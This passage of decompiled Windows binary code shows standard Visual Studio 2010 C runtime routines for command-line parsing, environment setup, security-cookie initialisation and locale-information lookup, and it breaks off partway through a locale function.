// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wincmdln
// 
// Library: Visual Studio 2010 Release

byte * __wincmdln(void)

{
  byte bVar1;
  bool bVar2;
  int iVar3;
  byte *pbVar4;
  
  bVar2 = false;
  if (_DAT_003ea16c == 0) {
    ___initmbctable();
  }
  pbVar4 = DAT_003ea178;
  if (DAT_003ea178 == (byte *)0x0) {
    pbVar4 = &DAT_003ce656;
  }
  do {
    bVar1 = *pbVar4;
    if (bVar1 < 0x21) {
      if (bVar1 == 0) {
        return pbVar4;
      }
      if (!bVar2) {
        for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
        }
        return pbVar4;
      }
    }
    if (bVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    iVar3 = __ismbblead((uint)bVar1);
    if (iVar3 != 0) {
      pbVar4 = pbVar4 + 1;
    }
    pbVar4 = pbVar4 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setenvp
// 
// Library: Visual Studio 2010 Release

int __cdecl __setenvp(void)

{
  code *pcVar1;
  char **ppcVar2;
  size_t sVar3;
  char *_Dst;
  errno_t eVar4;
  char *pcVar5;
  int iVar6;
  
  if (_DAT_003ea16c == 0) {
    ___initmbctable();
  }
  iVar6 = 0;
  pcVar5 = DAT_003d7cec;
  if (DAT_003d7cec != (char *)0x0) {
    for (; *pcVar5 != '\0'; pcVar5 = pcVar5 + sVar3 + 1) {
      if (*pcVar5 != '=') {
        iVar6 = iVar6 + 1;
      }
      sVar3 = _strlen(pcVar5);
    }
    ppcVar2 = (char **)__calloc_crt(iVar6 + 1,4);
    pcVar5 = DAT_003d7cec;
    DAT_003d8040 = ppcVar2;
    if (ppcVar2 != (char **)0x0) {
      do {
        if (*pcVar5 == '\0') {
          _free(DAT_003d7cec);
          DAT_003d7cec = (char *)0x0;
          *ppcVar2 = (char *)0x0;
          _DAT_003ea160 = 1;
          return 0;
        }
        sVar3 = _strlen(pcVar5);
        sVar3 = sVar3 + 1;
        if (*pcVar5 != '=') {
          _Dst = (char *)__calloc_crt(sVar3,1);
          *ppcVar2 = _Dst;
          if (_Dst == (char *)0x0) {
            _free(DAT_003d8040);
            DAT_003d8040 = (char **)0x0;
            return -1;
          }
          eVar4 = _strcpy_s(_Dst,sVar3,pcVar5);
          if (eVar4 != 0) {
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
            pcVar1 = (code *)swi(3);
            iVar6 = (*pcVar1)();
            return iVar6;
          }
          ppcVar2 = ppcVar2 + 1;
        }
        pcVar5 = pcVar5 + sVar3;
      } while( true );
    }
  }
  return -1;
}



// Library Function - Single Match
//  _parse_cmdline
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall
_parse_cmdline(undefined4 param_1,byte *param_2,byte **param_3,byte *param_4,int *param_5)

{
  bool bVar1;
  bool bVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte bVar6;
  byte *pbVar7;
  byte *pbVar8;
  int *unaff_EDI;
  
  *unaff_EDI = 0;
  *param_5 = 1;
  if (param_3 != (byte **)0x0) {
    *param_3 = param_4;
    param_3 = param_3 + 1;
  }
  bVar2 = false;
  pbVar5 = param_4;
  do {
    if (*param_2 == 0x22) {
      bVar2 = !bVar2;
      bVar6 = 0x22;
      pbVar7 = param_2 + 1;
    }
    else {
      *unaff_EDI = *unaff_EDI + 1;
      if (pbVar5 != (byte *)0x0) {
        *pbVar5 = *param_2;
        param_4 = pbVar5 + 1;
      }
      bVar6 = *param_2;
      pbVar7 = param_2 + 1;
      iVar3 = __ismbblead((uint)bVar6);
      if (iVar3 != 0) {
        *unaff_EDI = *unaff_EDI + 1;
        if (param_4 != (byte *)0x0) {
          *param_4 = *pbVar7;
          param_4 = param_4 + 1;
        }
        pbVar7 = param_2 + 2;
      }
      pbVar5 = param_4;
      if (bVar6 == 0) {
        pbVar7 = pbVar7 + -1;
        goto LAB_003ba171;
      }
    }
    param_2 = pbVar7;
  } while ((bVar2) || ((bVar6 != 0x20 && (bVar6 != 9))));
  if (pbVar5 != (byte *)0x0) {
    pbVar5[-1] = 0;
  }
LAB_003ba171:
  bVar2 = false;
  while (*pbVar7 != 0) {
    for (; (*pbVar7 == 0x20 || (*pbVar7 == 9)); pbVar7 = pbVar7 + 1) {
    }
    if (*pbVar7 == 0) break;
    if (param_3 != (byte **)0x0) {
      *param_3 = pbVar5;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
    while( true ) {
      bVar1 = true;
      uVar4 = 0;
      for (; *pbVar7 == 0x5c; pbVar7 = pbVar7 + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*pbVar7 == 0x22) {
        pbVar8 = pbVar7;
        if (((uVar4 & 1) == 0) && ((!bVar2 || (pbVar8 = pbVar7 + 1, *pbVar8 != 0x22)))) {
          bVar1 = false;
          bVar2 = !bVar2;
          pbVar8 = pbVar7;
        }
        uVar4 = uVar4 >> 1;
        pbVar7 = pbVar8;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (pbVar5 != (byte *)0x0) {
          *pbVar5 = 0x5c;
          pbVar5 = pbVar5 + 1;
        }
        *unaff_EDI = *unaff_EDI + 1;
        param_4 = pbVar5;
      }
      bVar6 = *pbVar7;
      if ((bVar6 == 0) || ((!bVar2 && ((bVar6 == 0x20 || (bVar6 == 9)))))) break;
      if (bVar1) {
        if (pbVar5 == (byte *)0x0) {
          iVar3 = __ismbblead((int)(char)bVar6);
          if (iVar3 != 0) {
            pbVar7 = pbVar7 + 1;
            *unaff_EDI = *unaff_EDI + 1;
          }
        }
        else {
          iVar3 = __ismbblead((int)(char)bVar6);
          if (iVar3 != 0) {
            *param_4 = *pbVar7;
            pbVar7 = pbVar7 + 1;
            *unaff_EDI = *unaff_EDI + 1;
            param_4 = param_4 + 1;
          }
          *param_4 = *pbVar7;
          param_4 = param_4 + 1;
        }
        *unaff_EDI = *unaff_EDI + 1;
        pbVar5 = param_4;
      }
      pbVar7 = pbVar7 + 1;
    }
    if (pbVar5 != (byte *)0x0) {
      *pbVar5 = 0;
      pbVar5 = pbVar5 + 1;
      param_4 = pbVar5;
    }
    *unaff_EDI = *unaff_EDI + 1;
  }
  if (param_3 != (byte **)0x0) {
    *param_3 = (byte *)0x0;
  }
  *param_5 = *param_5 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setargv
// 
// Library: Visual Studio 2010 Release

int __cdecl __setargv(void)

{
  uint uVar1;
  byte **ppbVar2;
  undefined4 extraout_ECX;
  uint _Size;
  uint local_10;
  uint local_c;
  byte *local_8;
  
  if (_DAT_003ea16c == 0) {
    ___initmbctable();
  }
  DAT_003d89d4 = 0;
  GetModuleFileNameA((HMODULE)0x0,&DAT_003d88d0,0x104);
  _DAT_003d8050 = &DAT_003d88d0;
  if ((DAT_003ea178 == (byte *)0x0) || (local_8 = DAT_003ea178, *DAT_003ea178 == 0)) {
    local_8 = &DAT_003d88d0;
  }
  _parse_cmdline(extraout_ECX,local_8,(byte **)0x0,(byte *)0x0,(int *)&local_c);
  uVar1 = local_c;
  if ((local_c < 0x3fffffff) && (local_10 != 0xffffffff)) {
    _Size = local_c * 4 + local_10;
    if ((local_10 <= _Size) && (ppbVar2 = (byte **)__malloc_crt(_Size), ppbVar2 != (byte **)0x0)) {
      _parse_cmdline(_Size,local_8,ppbVar2,(byte *)(ppbVar2 + uVar1),(int *)&local_c);
      _DAT_003d8034 = local_c - 1;
      _DAT_003d8038 = ppbVar2;
      return 0;
    }
  }
  return -1;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsA
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl ___crtGetEnvironmentStringsA(void)

{
  WCHAR WVar1;
  LPWCH lpWideCharStr;
  WCHAR *pWVar2;
  int iVar4;
  size_t _Size;
  LPSTR local_8;
  WCHAR *pWVar3;
  
  lpWideCharStr = GetEnvironmentStringsW();
  if (lpWideCharStr == (LPWCH)0x0) {
    local_8 = (LPSTR)0x0;
  }
  else {
    WVar1 = *lpWideCharStr;
    pWVar2 = lpWideCharStr;
    while (WVar1 != L'\0') {
      do {
        pWVar3 = pWVar2;
        pWVar2 = pWVar3 + 1;
      } while (*pWVar2 != L'\0');
      pWVar2 = pWVar3 + 2;
      WVar1 = *pWVar2;
    }
    iVar4 = ((int)pWVar2 - (int)lpWideCharStr >> 1) + 1;
    _Size = WideCharToMultiByte(0,0,lpWideCharStr,iVar4,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
    if ((_Size == 0) || (local_8 = (LPSTR)__malloc_crt(_Size), local_8 == (LPSTR)0x0)) {
      FreeEnvironmentStringsW(lpWideCharStr);
      local_8 = (LPSTR)0x0;
    }
    else {
      iVar4 = WideCharToMultiByte(0,0,lpWideCharStr,iVar4,local_8,_Size,(LPCSTR)0x0,(LPBOOL)0x0);
      if (iVar4 == 0) {
        _free(local_8);
        local_8 = (LPSTR)0x0;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
    }
  }
  return local_8;
}



// WARNING: Removing unreachable block (ram,0x003ba3dd)
// WARNING: Removing unreachable block (ram,0x003ba3e3)
// WARNING: Removing unreachable block (ram,0x003ba3e5)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2010 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2010 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  uint local_14;
  uint local_10;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_003d6664 == 0xbb40e64e) || ((DAT_003d6664 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime((LPFILETIME)&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter((LARGE_INTEGER *)&local_14);
    DAT_003d6664 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_10 ^ local_14;
    if (DAT_003d6664 == 0xbb40e64e) {
      DAT_003d6664 = 0xbb40e64f;
    }
    else {
      if ((DAT_003d6664 & 0xffff0000) == 0) {
        DAT_003d6664 = DAT_003d6664 | (DAT_003d6664 | 0x4711) << 0x10;
      }
    }
    DAT_003d6668 = ~DAT_003d6664;
  }
  else {
    DAT_003d6668 = ~DAT_003d6664;
  }
  return;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  ___getlocaleinfo
// 
// Library: Visual Studio 2010 Release

int __cdecl
___getlocaleinfo(_locale_t _Locale,int _Lc_type,LPCWSTR _LocaleName,LCTYPE _FieldType,void *_Address
                )

{
  size_t sVar1;
  DWORD DVar2;
  LPSTR _LpLCData;
  char *_Dst;
  errno_t eVar3;
  LPWSTR lpLCData;
  undefined4 in_EDX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined uVar4;
  size_t in_stack_ffffff6c;
  int iVar5;
  _locale_t local_8c;
  CHAR local_88 [128];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_8c = _Locale;
  if (_Lc_type == 1) {
    iVar5 = 0;
    _LpLCData = local_88;
    sVar1 = ___crtGetLocaleInfoA(_Locale,_LocaleName,_FieldType,_LpLCData,0x80);
    if (sVar1 == 0) {
      DVar2 = GetLastError();
      in_EDX = extraout_EDX;
      if (((DVar2 == 0x7a) &&
          (in_stack_ffffff6c = ___crtGetLocaleInfoA(local_8c,_LocaleName,_FieldType,(LPSTR)0x0,0),
          in_EDX = extraout_EDX_00, in_stack_ffffff6c != 0)) &&
         (_LpLCData = (LPSTR)__calloc_crt(in_stack_ffffff6c,1), in_EDX = extraout_EDX_01,
         _LpLCData != (LPSTR)0x0)) {
        iVar5 = 1;
        sVar1 = ___crtGetLocaleInfoA(local_8c,_LocaleName,_FieldType,_LpLCData,in_stack_ffffff6c);
        if (sVar1 != 0) goto LAB_003ba56a;
LAB_003ba584:
        _free(_LpLCData);
        in_EDX = extraout_EDX_03;
      }
    }
    else {
LAB_003ba56a:
      _Dst = (char *)__calloc_crt(sVar1,1);
      *(char **)_Address = _Dst;
      _Address = (LPWSTR *)0x0;
      if (_Dst != (char *)0x0) {
        eVar3 = _strncpy_s(_Dst,sVar1,_LpLCData,sVar1 - 1);
        uVar4 = (undefined)in_stack_ffffff6c;
        if (eVar3 == 0) {
          in_EDX = extraout_EDX_04;
          if (iVar5 != 0) {
            _free(_LpLCData);
            in_EDX = extraout_EDX_05;
          }
          goto LAB_003ba58e;
        }
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        in_EDX = extraout_EDX_06;
        goto LAB_003ba5cd;
      }
      in_EDX = extraout_EDX_02;
      if (iVar5 != 0) goto LAB_003ba584;
    }
  }
  else {
LAB_003ba5cd:
    if (_Lc_type == 2) {
      *(LPWSTR *)_Address = (LPWSTR)0x0;
      sVar1 = GetLocaleInfoW((LCID)_LocaleName,_FieldType,(LPWSTR)0x0,0);
      if (sVar1 != 0) {
        lpLCData = (LPWSTR)__calloc_crt(sVar1,2);
        *(LPWSTR *)_Address = lpLCData;
        if (lpLCData != (LPWSTR)0x0) {
          iVar5 = GetLocaleInfoW((LCID)_LocaleName,_FieldType,lpLCData,sVar1);
          uVar4 = (undefined)in_stack_ffffff6c;
          in_EDX = extraout_EDX_07;
          if (iVar5 != 0) goto LAB_003ba58e;
        }
      }
                    // WARNING: Load size is inaccurate
      _free(*_Address);
      *(LPWSTR *)_Address = (LPWSTR)0x0;
      in_EDX = extraout_EDX_08;
    }
    else {
      if (_Lc_type == 0) {
        local_8c = (_locale_t)0x0;
        iVar5 = GetLocaleInfoW((LCID)_LocaleName,_FieldType | 0x20000000,(LPWSTR)&local_8c,2);
        uVar4 = (undefined)in_stack_ffffff6c;
        in_EDX = extraout_EDX_09;
        if (iVar5 != 0) {
          *(undefined *)_Address = local_8c._0_1_;
          goto LAB_003ba58e;
        }
      }
    }
  }
  uVar4 = (undefined)in_stack_ffffff6c;
LAB_003ba58e:
  iVar5 = terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,in_EDX,uVar4);
  return iVar5;
}



void __cdecl FUN_003ba65c(PVOID param_1)

{
  Ptr_003d89d8 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2010 Release
// Ptr parameter of EncodePointer
// 

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
  _abort();
  return;
}



void FUN_003ba6a4(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2010 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(Ptr_003d89dc);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_003ba6ef(void)

{
  Ptr_003d89dc = EncodePointer(terminate);
  return;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Library: Visual Studio 2010 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



undefined * _GOST_KEY_TRANSPORT_it(void)

{
  return &DAT_003d70c0;
}



undefined ** _GOST_KEY_TRANSPORT_it(void)

{
  return &PTR_s_No_error_003d7010;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  rsize_t rVar5;
  errno_t eStack20;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_003ba77e:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          rVar5 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            iVar4 = (int)_Dst - (int)_Src;
            do {
              cVar1 = *_Src;
              _Src[iVar4] = cVar1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar5 = rVar5 - 1;
            } while (rVar5 != 0);
          }
          else {
            pcVar3 = _Dst;
            do {
              cVar1 = pcVar3[(int)_Src - (int)_Dst];
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              if ((cVar1 == '\0') || (rVar5 = rVar5 - 1, rVar5 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar5 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eStack20 = 0x22;
          *piVar2 = 0x22;
          goto LAB_003ba78f;
        }
        *_Dst = '\0';
      }
    }
  }
  else {
    if (_Dst != (char *)0x0) goto LAB_003ba77e;
  }
  piVar2 = __errno();
  eStack20 = 0x16;
  *piVar2 = 0x16;
LAB_003ba78f:
  FUN_003b60f9();
  return eStack20;
}



// Library Function - Single Match
//  __get_lc_time
// 
// Library: Visual Studio 2010 Release

uint __fastcall __get_lc_time(void *param_1)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  uint uVar25;
  uint uVar26;
  uint uVar27;
  uint uVar28;
  uint uVar29;
  uint uVar30;
  uint uVar31;
  uint uVar32;
  uint uVar33;
  uint uVar34;
  uint uVar35;
  uint uVar36;
  uint uVar37;
  uint uVar38;
  uint uVar39;
  uint uVar40;
  uint uVar41;
  uint uVar42;
  uint uVar43;
  uint uVar44;
  uint uVar45;
  uint uVar46;
  uint uVar47;
  uint uVar48;
  uint uVar49;
  uint uVar50;
  uint uVar51;
  uint uVar52;
  uint uVar53;
  uint uVar54;
  uint uVar55;
  uint uVar56;
  uint uVar57;
  uint uVar58;
  uint uVar59;
  uint uVar60;
  uint uVar61;
  uint uVar62;
  uint uVar63;
  uint uVar64;
  uint uVar65;
  uint uVar66;
  uint uVar67;
  uint uVar68;
  uint uVar69;
  uint uVar70;
  uint uVar71;
  uint uVar72;
  uint uVar73;
  uint uVar74;
  uint uVar75;
  uint uVar76;
  uint uVar77;
  uint uVar78;
  uint uVar79;
  uint uVar80;
  uint uVar81;
  uint uVar82;
  uint uVar83;
  uint uVar84;
  uint uVar85;
  uint uVar86;
  uint uVar87;
  LPCWSTR _LocaleName;
  localeinfo_struct local_10;
  LPCWSTR local_8;
  
  _LocaleName = (LPCWSTR)(uint)*(ushort *)(in_EAX + 0x42);
  local_8 = (LPCWSTR)(uint)*(ushort *)(in_EAX + 0x44);
  if (param_1 == (void *)0x0) {
    uVar1 = 0xffffffff;
  }
  else {
    local_10.mbcinfo = (pthreadmbcinfo)0x0;
    uVar2 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x31,(void *)((int)param_1 + 4));
    uVar3 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x32,(void *)((int)param_1 + 8));
    uVar4 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x33,(void *)((int)param_1 + 0xc));
    uVar5 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x34,(void *)((int)param_1 + 0x10));
    uVar6 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x35,(void *)((int)param_1 + 0x14));
    uVar7 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x36,(void *)((int)param_1 + 0x18));
    uVar8 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x37,param_1);
    uVar9 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2a,(void *)((int)param_1 + 0x20));
    uVar10 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2b,(void *)((int)param_1 + 0x24))
    ;
    uVar11 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2c,(void *)((int)param_1 + 0x28))
    ;
    uVar12 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2d,(void *)((int)param_1 + 0x2c))
    ;
    uVar13 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2e,(void *)((int)param_1 + 0x30))
    ;
    uVar14 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x2f,(void *)((int)param_1 + 0x34))
    ;
    uVar15 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x30,(void *)((int)param_1 + 0x1c))
    ;
    uVar16 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x44,(void *)((int)param_1 + 0x38))
    ;
    uVar17 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x45,(void *)((int)param_1 + 0x3c))
    ;
    uVar18 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x46,(void *)((int)param_1 + 0x40))
    ;
    uVar19 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x47,(void *)((int)param_1 + 0x44))
    ;
    uVar20 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x48,(void *)((int)param_1 + 0x48))
    ;
    uVar21 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x49,(void *)((int)param_1 + 0x4c))
    ;
    uVar22 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4a,(void *)((int)param_1 + 0x50))
    ;
    uVar23 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4b,(void *)((int)param_1 + 0x54))
    ;
    uVar24 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4c,(void *)((int)param_1 + 0x58))
    ;
    uVar25 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4d,(void *)((int)param_1 + 0x5c))
    ;
    uVar26 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4e,(void *)((int)param_1 + 0x60))
    ;
    uVar27 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x4f,(void *)((int)param_1 + 100));
    uVar28 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x38,(void *)((int)param_1 + 0x68))
    ;
    uVar29 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x39,(void *)((int)param_1 + 0x6c))
    ;
    uVar30 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3a,(void *)((int)param_1 + 0x70))
    ;
    uVar31 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3b,(void *)((int)param_1 + 0x74))
    ;
    uVar32 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3c,(void *)((int)param_1 + 0x78))
    ;
    uVar33 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3d,(void *)((int)param_1 + 0x7c))
    ;
    uVar34 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3e,(void *)((int)param_1 + 0x80))
    ;
    uVar35 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x3f,(void *)((int)param_1 + 0x84))
    ;
    uVar36 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x40,(void *)((int)param_1 + 0x88))
    ;
    uVar37 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x41,(void *)((int)param_1 + 0x8c))
    ;
    uVar38 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x42,(void *)((int)param_1 + 0x90))
    ;
    uVar39 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x43,(void *)((int)param_1 + 0x94))
    ;
    uVar40 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x28,(void *)((int)param_1 + 0x98))
    ;
    uVar41 = ___getlocaleinfo((_locale_t)&local_10,1,_LocaleName,0x29,(void *)((int)param_1 + 0x9c))
    ;
    uVar42 = ___getlocaleinfo((_locale_t)&local_10,1,local_8,0x1f,(void *)((int)param_1 + 0xa0));
    uVar43 = ___getlocaleinfo((_locale_t)&local_10,1,local_8,0x20,(void *)((int)param_1 + 0xa4));
    uVar44 = ___getlocaleinfo((_locale_t)&local_10,1,local_8,0x1003,(void *)((int)param_1 + 0xa8));
    uVar45 = ___getlocaleinfo((_locale_t)&local_10,0,local_8,0x1009,(void *)((int)param_1 + 0xb0));
    *(LPCWSTR *)((int)param_1 + 0xac) = local_8;
    uVar46 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x31,(void *)((int)param_1 + 0xbc))
    ;
    uVar47 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x32,(void *)((int)param_1 + 0xc0))
    ;
    uVar48 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x33,(void *)((int)param_1 + 0xc4))
    ;
    uVar49 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x34,(void *)((int)param_1 + 200));
    uVar50 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x35,(void *)((int)param_1 + 0xcc))
    ;
    uVar51 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x36,(void *)((int)param_1 + 0xd0))
    ;
    uVar52 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x37,(void *)((int)param_1 + 0xb8))
    ;
    uVar53 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2a,(void *)((int)param_1 + 0xd8))
    ;
    uVar54 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2b,(void *)((int)param_1 + 0xdc))
    ;
    uVar55 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2c,(void *)((int)param_1 + 0xe0))
    ;
    uVar56 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2d,(void *)((int)param_1 + 0xe4))
    ;
    uVar57 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2e,(void *)((int)param_1 + 0xe8))
    ;
    uVar58 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x2f,(void *)((int)param_1 + 0xec))
    ;
    uVar59 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x30,(void *)((int)param_1 + 0xd4))
    ;
    uVar60 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x44,(void *)((int)param_1 + 0xf0))
    ;
    uVar61 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x45,(void *)((int)param_1 + 0xf4))
    ;
    uVar62 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x46,(void *)((int)param_1 + 0xf8))
    ;
    uVar63 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x47,(void *)((int)param_1 + 0xfc))
    ;
    uVar64 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x48,(void *)((int)param_1 + 0x100)
                             );
    uVar65 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x49,(void *)((int)param_1 + 0x104)
                             );
    uVar66 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4a,(void *)((int)param_1 + 0x108)
                             );
    uVar67 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4b,(void *)((int)param_1 + 0x10c)
                             );
    uVar68 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4c,(void *)((int)param_1 + 0x110)
                             );
    uVar69 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4d,(void *)((int)param_1 + 0x114)
                             );
    uVar70 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4e,(void *)((int)param_1 + 0x118)
                             );
    uVar71 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x4f,(void *)((int)param_1 + 0x11c)
                             );
